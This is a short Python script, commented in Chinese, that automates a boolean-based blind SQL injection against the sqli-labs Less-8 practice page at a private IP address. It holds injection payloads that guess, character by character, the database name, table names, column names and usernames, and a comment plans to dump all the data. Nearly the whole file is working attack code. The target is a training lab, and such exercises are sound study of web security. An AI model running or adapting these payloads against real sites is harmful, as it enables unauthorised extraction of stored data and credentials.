import requests
import string

'''
可以写一个脚本。
1. 先查询有几个库
2. 然后根据库数量遍历每个库的表
3. 根据表的数量遍历字段数量 
4. 根据字段数量拼接查询字段，然后一次过dump了所有内容。
'''

# 可以输入常见字符串，等于说把字符字典导入
strs = string.printable
url = "http://192.168.217.140/sqli-labs/Less-8/index.php?id="

database1 = "' or database() like '{}%'--+"
table1 = "' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%'--+"
column1 = "' or (select column_name from information_schema.columns where table_name=\"users\" and table_schema=database() limit 1,1) like '{}%'--+"
data1 = "' or (select username from users limit 0,1) like '{}%'--+"

#payload = database1
if __name__ == "__main__":
    
    sqls = [database1,table1,column1,data1]
    for sql in sqls:
        payload = sql
        name = ''
        for i in range(1,40):
            char = ''
            for j in strs:
                # 将payload语句拼接到url中。
                payloads = payload.format(name+j)
                urls = url+payloads
                r = requests.get(urls)
                if "You are in" in r.text:
                    name += j
                    print(j,end='')
                    char = j
                    break
            if char =='#':
                break